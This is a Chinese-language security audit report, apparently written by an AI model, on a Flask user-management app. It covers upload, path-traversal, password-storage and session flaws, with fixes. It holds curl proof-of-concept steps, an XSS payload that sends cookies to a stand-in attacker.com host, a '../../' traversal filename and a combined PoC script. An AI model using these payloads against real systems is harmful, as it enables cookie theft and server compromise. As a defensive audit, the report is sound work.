# 🛡️ 安全审计报告

## Flask 用户管理系统 — 文件上传与认证漏洞分析

---

| 审计信息 | 内容 |
|---------|------|
| **项目名称** | Flask 用户信息管理平台 |
| **项目路径** | `/opt/Class01/` |
| **审计日期** | 2026-07-21 |
| **审计人员** | Claude |
| **漏洞总数** | 6 个（高危 4 个，中危 2 个） |

---

## 目录

1. [漏洞汇总](#1-漏洞汇总)
2. [漏洞①：任意文件上传](#2-漏洞任意文件上传)
3. [漏洞②：路径穿越漏洞](#3-漏洞路径穿越漏洞)
4. [漏洞③：文件名覆盖漏洞](#4-漏洞文件名覆盖漏洞)
5. [漏洞④：注册密码明文存储](#5-漏洞注册密码明文存储)
6. [漏洞⑤：登录明文密码比对](#6-漏洞登录明文密码比对)
7. [漏洞⑥：Session 永不过期](#7-漏洞session-永不过期)
8. [修复验证汇总](#8-修复验证汇总)

---

## 1. 漏洞汇总

| 编号 | 漏洞名称 | 漏洞类型 | 严重程度 | 所在文件 | 行号 |
|:----:|---------|---------|:--------:|---------|:----:|
| ① | **任意文件上传** | 文件上传漏洞 | 🔴 **严重** | `app.py` | 第 257 行 |
| ② | **路径穿越** | 路径遍历 | 🟠 **高危** | `app.py` | 第 257 行 |
| ③ | **文件名覆盖** | 文件覆盖 | 🟠 **高危** | `app.py` | 第 258-259 行 |
| ④ | **注册密码明文** | 敏感信息泄露 | 🟠 **高危** | `app.py` | 第 222 行 |
| ⑤ | **登录明文比对** | 认证缺陷 | 🟠 **高危** | `app.py` | 第 191 行 |
| ⑥ | **Session 永不过期** | Session 固定 | 🟢 **中危** | `app.py` | 未配置 |

---

## 2. 漏洞①：任意文件上传

### 漏洞信息

| 字段 | 内容 |
|------|------|
| **漏洞名称** | 任意文件上传（Unrestricted File Upload） |
| **漏洞类型** | 文件上传漏洞 |
| **严重程度** | 🔴 **严重** |
| **CWE 编号** | CWE-434 |
| **漏洞文件** | `app.py` |
| **漏洞路由** | `POST /upload` |
| **漏洞行号** | 第 257 行 |

### 漏洞代码（修复前）

```python
@app.route("/upload", methods=["GET", "POST"])
def upload():
    if "username" not in session:
        return redirect(url_for("login"))

    if request.method == "POST":
        if "file" not in request.files:
            return render_template("upload.html", error="未选择文件")

        file = request.files["file"]

        if file.filename == "":
            return render_template("upload.html", error="未选择文件")

        # ❌ 漏洞点：无任何文件类型检查
        filename = file.filename
        file_path = os.path.join(UPLOAD_FOLDER, filename)
        file.save(file_path)

        file_url = url_for("static", filename=f"uploads/{filename}")
        return render_template("upload.html", success=True, file_url=file_url, filename=filename)
```

### 漏洞原理

服务端在接收用户上传文件时，**没有对文件的类型做任何检查**（不检查后缀名、不检查 MIME 类型、不检查文件内容）。攻击者可以上传任意类型的文件到服务器。

### 攻击场景

#### 场景 1：上传恶意 HTML/JS 文件（XSS 攻击）

攻击者上传一个包含恶意 JavaScript 的 HTML 文件，然后诱骗其他用户访问该文件，窃取 cookie 或重定向到钓鱼网站。

```bash
# 攻击步骤
# 1. 登录
curl -c /tmp/attack.txt -X POST http://target/login \
  -d "username=admin&password=admin123"

# 2. 上传恶意 HTML 文件（XSS payload）
echo '<html><body><script>
  fetch("http://attacker.com/steal?cookie=" + document.cookie)
</script></body></html>' > /tmp/xss.html

curl -b /tmp/attack.txt -X POST http://target/upload \
  -F "file=@/tmp/xss.html"
# ✅ 上传成功！没有任何拦截

# 3. 获取上传后的文件 URL
# http://target/static/uploads/xss.html

# 4. 将该 URL 发送给其他用户访问
# 受害者访问后，其 cookie 被发送到攻击者服务器
```

#### 场景 2：上传可执行文件（GetShell）

```bash
# 上传 Python 脚本
echo 'import os; os.system("whoami")' > /tmp/shell.py
curl -b /tmp/attack.txt -X POST http://target/upload \
  -F "file=@/tmp/shell.py"
# ✅ 上传成功

# 如果能配合其他漏洞执行该文件，即可控制服务器
```

#### 场景 3：上传文件耗尽磁盘空间

```bash
# 上传大文件（<=16MB），多次上传可以耗尽服务器磁盘
dd if=/dev/zero of=/tmp/bigfile.bin bs=1M count=15
curl -b /tmp/attack.txt -X POST http://target/upload \
  -F "file=@/tmp/bigfile.bin"
```

### 修复方案

```python
# ✅ 仅允许图片类型文件上传
ALLOWED_EXTENSIONS = {"png", "jpg", "jpeg", "gif", "bmp", "webp", "svg"}

def allowed_file(filename: str) -> bool:
    return "." in filename and filename.rsplit(".", 1)[1].lower() in ALLOWED_EXTENSIONS

# 上传时调用
if not allowed_file(filename):
    return render_template("upload.html", error="不支持的文件类型，仅允许图片文件")
```

### 修复验证

```bash
# 修复后上传 .html 文件被拒绝
curl -b /tmp/cookie.txt -X POST http://target/upload \
  -F "file=@/tmp/test.html"
# 输出：❌ "不支持的文件类型，仅允许图片文件"
```

---

## 3. 漏洞②：路径穿越漏洞

### 漏洞信息

| 字段 | 内容 |
|------|------|
| **漏洞名称** | 路径穿越（Path Traversal） |
| **漏洞类型** | 路径遍历 |
| **严重程度** | 🟠 **高危** |
| **CWE 编号** | CWE-22 |
| **漏洞文件** | `app.py` |
| **漏洞路由** | `POST /upload` |
| **漏洞行号** | 第 257-258 行 |

### 漏洞代码（修复前）

```python
# ❌ 漏洞点：直接使用用户提供的文件名，包含路径
filename = file.filename                          # 第 257 行
file_path = os.path.join(UPLOAD_FOLDER, filename)  # 第 258 行
file.save(file_path)                               # 第 259 行
```

### 漏洞原理

攻击者可以通过在文件名中加入 `../` 等路径穿越符号，将文件写入到服务器上的任意目录。`os.path.join()` 不会阻止路径穿越。

### 攻击场景

```bash
# 攻击步骤
# 1. 登录
curl -c /tmp/attack.txt -X POST http://target/login \
  -d "username=admin&password=admin123"

# 2. 上传文件，文件名包含路径穿越符
echo "恶意代码" > /tmp/payload.txt

curl -b /tmp/attack.txt -X POST http://target/upload \
  -F "file=@/tmp/payload.txt;filename=../../templates/evil.html"
```

**执行过程：**
```
原始上传路径：static/uploads/
文件名参数：../../templates/evil.html
os.path.join() 拼接后：static/uploads/../../templates/evil.html
实际写入路径：templates/evil.html       ← 穿越到 templates 目录！
```

**危害：**
1. 覆盖应用模板文件（`templates/*.html`），植入恶意内容
2. 覆盖配置文件，修改应用行为
3. 向系统目录写入文件（如 `.bashrc`、`cron` 任务）

### 修复方案

```python
# ✅ 使用 os.path.basename() 过滤路径
filename = os.path.basename(file.filename)
# 例如：../../evil.txt → evil.txt
```

### 修复验证

```bash
curl -b /tmp/cookie.txt -X POST http://target/upload \
  -F "file=@/tmp/test.txt;filename=../../evil.txt"
# ❌ 文件名被截取为 evil.txt，无法穿越目录
```

---

## 4. 漏洞③：文件名覆盖漏洞

### 漏洞信息

| 字段 | 内容 |
|------|------|
| **漏洞名称** | 文件名覆盖（File Overwrite） |
| **漏洞类型** | 文件完整性 |
| **严重程度** | 🟠 **高危** |
| **CWE 编号** | CWE-552 |
| **漏洞文件** | `app.py` |
| **漏洞路由** | `POST /upload` |
| **漏洞行号** | 第 258-259 行 |

### 漏洞代码（修复前）

```python
# ❌ 漏洞点：直接保存，不检查文件是否已存在
filename = file.filename
file_path = os.path.join(UPLOAD_FOLDER, filename)
file.save(file_path)  # 同名文件会被静默覆盖
```

### 漏洞原理

当上传的文件名与服务器上已有文件同名时，Flask 的 `file.save()` 方法会**静默覆盖**已有文件，没有任何警告。

### 攻击场景

#### 场景 1：破坏其他用户的头像

```bash
# 用户 A 上传了头像 avatar.png
# 攻击者上传同名文件，覆盖用户 A 的头像
curl -b /tmp/attack.txt -X POST http://target/upload \
  -F "file=@/tmp/malicious_avatar.png;filename=avatar.png"
# 原 avatar.png 被覆盖，无法恢复
```

#### 场景 2：覆盖应用关键文件

如果已存在的上传文件被其他功能引用（如用户配置、临时数据等），覆盖可能导致功能破坏。

### 修复方案

```python
# ✅ 同名文件自动重命名
file_path = os.path.join(UPLOAD_FOLDER, filename)
counter = 1
name_part, ext_part = filename.rsplit(".", 1)
while os.path.exists(file_path):
    filename = f"{name_part}_{counter}.{ext_part}"
    file_path = os.path.join(UPLOAD_FOLDER, filename)
    counter += 1
file.save(file_path)
```

### 修复验证

```bash
# 第一次上传 avatar.png → 保存为 avatar.png
# 第二次上传 avatar.png → 保存为 avatar_1.png
# 第三次上传 avatar.png → 保存为 avatar_2.png
# 不会覆盖已有文件
```

---

## 5. 漏洞④：注册密码明文存储

### 漏洞信息

| 字段 | 内容 |
|------|------|
| **漏洞名称** | 密码明文存储 |
| **漏洞类型** | 敏感信息泄露 |
| **严重程度** | 🟠 **高危** |
| **CWE 编号** | CWE-312 |
| **漏洞文件** | `app.py` |
| **漏洞路由** | `POST /register` |
| **漏洞行号** | 第 222 行 |

### 漏洞代码（修复前）

```python
# 注册路由
sql = "INSERT INTO users (username, password, email, phone) VALUES (?, ?, ?, ?)"
# ❌ 漏洞点：明文密码直接存入数据库
c.execute(sql, (username, password, email, phone))
```

```sql
-- 数据库中的内容（修复前）
SELECT username, password FROM users;
admin    | admin123           ← 明文！
alice    | alice2025          ← 明文！
newuser  | mypassword123      ← 明文！
```

### 漏洞原理

用户在注册时输入的密码以**明文形式**直接存储到 SQLite 数据库中。任何人只要有数据库文件的读取权限（例如通过 SQL 注入、目录遍历、服务器泄露等途径），就可以获取所有用户的密码。

### 攻击场景

#### 场景 1：数据库泄露导致撞库

```bash
# 假设攻击者通过各种途径获取到数据库文件
sqlite3 /opt/Class01/data/users.db "SELECT * FROM users;"

# 输出
1|admin|admin123|admin@example.com|13800138000
2|alice|alice2025|alice@example.com|13900139001

# 攻击者拿到这些密码后，尝试在支付宝、微信、QQ 等平台登录
# 因为很多用户在不同平台使用相同的密码
```

#### 场景 2：通过搜索功能泄露密码

未修复前，搜索接口返回全部用户字段（包括密码），虽然当前搜索只查了 `id, username, email, phone`，但如果后续代码修改，密码字段可能被暴露。

### 修复方案

```python
# ✅ 注册时哈希密码
from werkzeug.security import generate_password_hash, check_password_hash

hashed_password = generate_password_hash(password)
c.execute(sql, (username, hashed_password, email, phone))
```

### 修复验证

```bash
# 修复后数据库内容
sqlite3 users.db "SELECT username, password FROM users;"
admin    | scrypt:32768:8:1$dD2YBuEbe2u2MGeN$59247332...  ← 哈希
alice    | scrypt:32768:8:1$ve1b3JHJm7XMQzEV$08cbbb1d...  ← 哈希

# 哈希值不可逆，无法还原原始密码
```

---

## 6. 漏洞⑤：登录明文密码比对

### 漏洞信息

| 字段 | 内容 |
|------|------|
| **漏洞名称** | 登录明文密码比对 |
| **漏洞类型** | 认证缺陷 |
| **严重程度** | 🟠 **高危** |
| **CWE 编号** | CWE-522 |
| **漏洞文件** | `app.py` |
| **漏洞路由** | `POST /login` |
| **漏洞行号** | 第 191 行 |

### 漏洞代码（修复前）

```python
# 登录路由 - SQLite 用户验证
c.execute("SELECT username, password, email, phone FROM users WHERE username = ?", (username,))
row = c.fetchone()
# ❌ 漏洞点：密码明文比对 ==
if row and row[1] == password:
    session["username"] = username
    return redirect("/")
```

### 漏洞原理

登录验证注册用户时，从数据库中取出存储的明文密码，直接用 `==` 操作符和用户输入的密码比对。这意味着：
1. 数据库必须存储明文密码（否则无法比对）
2. 密码在比对过程中在内存中以明文形式存在
3. 无法使用哈希，因为 `==` 无法比对哈希

### 攻击场景

#### 场景 1：密码在日志中泄露

```python
# 如果后续任何人添加了日志打印
print(f"用户 {username} 登录，密码: {password}")
# 密码就会被写入日志文件，长期暴露
```

#### 场景 2：密码在调试信息中泄露

如果 `debug=True`（之前在漏洞⑤中已修复），错误堆栈可能包含变量值，密码可能被打印出来。

### 修复方案

```python
# ✅ 使用哈希比对
from werkzeug.security import check_password_hash

if row and check_password_hash(row[1], password):
    session["username"] = username
    return redirect("/")
```

### 修复后密码验证流程

```
用户输入密码 "admin123"
          ↓
check_password_hash(数据库哈希, "admin123")
          ↓
从哈希中提取 salt 和算法参数
          ↓
用同样的 salt 和算法对 "admin123" 重新计算哈希
          ↓
对比两个哈希值是否相同
          ↓
相同 → 密码正确 | 不同 → 密码错误
```

---

## 7. 漏洞⑥：Session 永不过期

### 漏洞信息

| 字段 | 内容 |
|------|------|
| **漏洞名称** | Session 永不过期 |
| **漏洞类型** | Session 管理缺陷 |
| **严重程度** | 🟢 **中危** |
| **CWE 编号** | CWE-613 |
| **漏洞文件** | `app.py` |
| **影响范围** | 全局 |

### 漏洞代码（修复前）

```python
# ❌ 漏洞点：未配置 Session 过期时间
# Flask 默认 Session 在浏览器关闭前永不过期
# 即使设置了 session.permanent = True，也没有配置过期时长
```

### 漏洞原理

Flask 的 session cookie 默认情况下**没有过期时间**，只要浏览器不关闭或用户不主动退出，登录状态可以保持数年。如果用户的 cookie 被窃取，攻击者可以长期使用该会话。

### 攻击场景

#### 场景 1：Cookie 窃取后的长期访问

```bash
# 1. 攻击者通过 XSS 或其他手段窃取用户的 session cookie
# 2. 由于 cookie 永不过期，攻击者可以长期使用

# 攻击者使用窃取的 cookie 登录
curl -b "session=窃取到的_cookie_值" http://target/
# 直接以受害者身份访问系统，无需密码
```

#### 场景 2：公共电脑上的会话残留

用户在公共电脑上登录后关闭浏览器，但 session cookie 仍然存在。下一个人打开浏览器即可直接进入系统。

### 修复方案

```python
# ✅ 设置 Session 过期时间为 30 分钟
app.config["PERMANENT_SESSION_LIFETIME"] = 30 * 60  # 30分钟

# 登录时设置 session 为永久（受过期时间约束）
session.permanent = True
```

### 修复验证

```python
# 配置生效后
# Session cookie 的 Max-Age 被设置为 1800 秒（30分钟）
# 30分钟内无操作 → 自动退出，需重新登录
```

---

## 8. 修复验证汇总

### 修复前后对比

| 漏洞 | POC 命令 | 修复前结果 | 修复后结果 |
|:----|---------|:----------:|:----------:|
| ① 任意文件上传 | `curl -F "file=@xss.html"` 上传 HTML | ✅ 上传成功，URL 可访问 | ❌ "不支持的文件类型" |
| ② 路径穿越 | `;filename=../../evil.txt` | ✅ 文件写入 templates/ 目录 | ❌ 仅保留纯文件名 evil.txt |
| ③ 文件名覆盖 | 上传同名文件 2 次 | ✅ 第 2 次静默覆盖第 1 次 | ❌ 自动重命名 `_1`、`_2` |
| ④ 密码明文 | `sqlite3 users.db "SELECT password"` | ✅ 明文 admin123 | ❌ 哈希 scrypt:32768:... |
| ⑤ 明文比对 | 用 admin/admin123 登录 | ✅ 登录成功（`==` 比明文） | ✅ 登录成功（哈希比对） |
| ⑥ Session 过期 | 检查 cookie 过期时间 | ❌ 永不过期 | ✅ 30 分钟过期 |

### 修复后数据库内容

```bash
# 修复前
$ sqlite3 users.db "SELECT username, password FROM users;"
admin|admin123
alice|alice2025

# 修复后
$ sqlite3 users.db "SELECT username, password FROM users;"
admin|scrypt:32768:8:1$dD2YBuEbe2u2MGeN$59247332c7eae33f93354800c304...
alice|scrypt:32768:8:1$ve1b3JHJm7XMQzEV$08cbbb1d375ffc00125c324dd80eb...

# 哈希值不可逆，无法还原原始密码
```

### 修复后文件上传行为

```bash
# 上传恶意 HTML → 被拒绝
$ curl -b cookie.txt -X POST http://target/upload -F "file=@/tmp/test.html"
"不支持的文件类型，仅允许图片文件 (jpg, png, gif, bmp, webp, svg)"

# 上传正常图片 → 成功
$ curl -b cookie.txt -X POST http://target/upload -F "file=@/tmp/avatar.png"
上传成功！访问路径：/static/uploads/avatar.png

# 上传同名图片 → 自动重命名
$ curl -b cookie.txt -X POST http://target/upload -F "file=@/tmp/avatar2.png;filename=avatar.png"
上传成功！访问路径：/static/uploads/avatar_1.png
```

### 修复方法总结

| 编号 | 漏洞 | 修复代码 | 修复原理 |
|:----:|------|---------|---------|
| ① | 任意文件上传 | `allowed_file()` 检查后缀 | **白名单**只允许图片格式 |
| ② | 路径穿越 | `os.path.basename()` | 过滤掉路径中的 `../` |
| ③ | 文件覆盖 | `while os.path.exists()` 自增重命名 | 检测冲突，自动编号 |
| ④ | 密码明文 | `generate_password_hash()` | 哈希算法**不可逆** |
| ⑤ | 明文比对 | `check_password_hash()` | 哈希比对，不比较明文 |
| ⑥ | Session 不过期 | `PERMANENT_SESSION_LIFETIME` | 设置 30 分钟超时 |

---

## 附录：完整的 POC 攻击脚本

```bash
#!/bin/bash
# 漏洞利用综合测试脚本
# 使用方法：bash poc_all.sh

TARGET="http://127.0.0.1:5000"
COOKIE_FILE="/tmp/poc_cookies.txt"

echo "========== 1. 登录 =========="
curl -c $COOKIE_FILE -X POST $TARGET/login \
  -d "username=admin&password=admin123"

echo ""
echo "========== 2. POC ①：任意文件上传（应被拒绝）=========="
echo "<script>alert('XSS')</script>" > /tmp/poc.html
curl -b $COOKIE_FILE -X POST $TARGET/upload \
  -F "file=@/tmp/poc.html"
echo ""

echo "========== 3. POC ②：路径穿越（应被拦截）=========="
echo "test" > /tmp/poc_evil.txt
curl -b $COOKIE_FILE -X POST $TARGET/upload \
  -F "file=@/tmp/poc_evil.txt;filename=../../evil.txt"
echo ""

echo "========== 4. POC ③：文件覆盖测试 =========="
echo "test1" > /tmp/poc1.png
echo "test2" > /tmp/poc2.png
curl -b $COOKIE_FILE -X POST $TARGET/upload -F "file=@/tmp/poc1.png;filename=cover.png"
curl -b $COOKIE_FILE -X POST $TARGET/upload -F "file=@/tmp/poc2.png;filename=cover.png"
echo ""

echo "========== 5. POC ④+⑤：数据库密码（应不是明文）=========="
sqlite3 /opt/Class01/data/users.db "SELECT username, password FROM users;" | head -3
echo ""

echo "========== 6. POC ⑥：Session 过期时间 =========="
python3 -c "
from flask import Flask
app = Flask(__name__)
app.config['PERMANENT_SESSION_LIFETIME'] = 1800
print(f'Session过期时间: {app.config[\"PERMANENT_SESSION_LIFETIME\"]}秒 = 30分钟')
"

echo ""
echo "========== 测试完成 =========="
```

---

*本报告由 Claude 自动生成，基于对 Flask 用户管理系统的完整安全审计过程。*
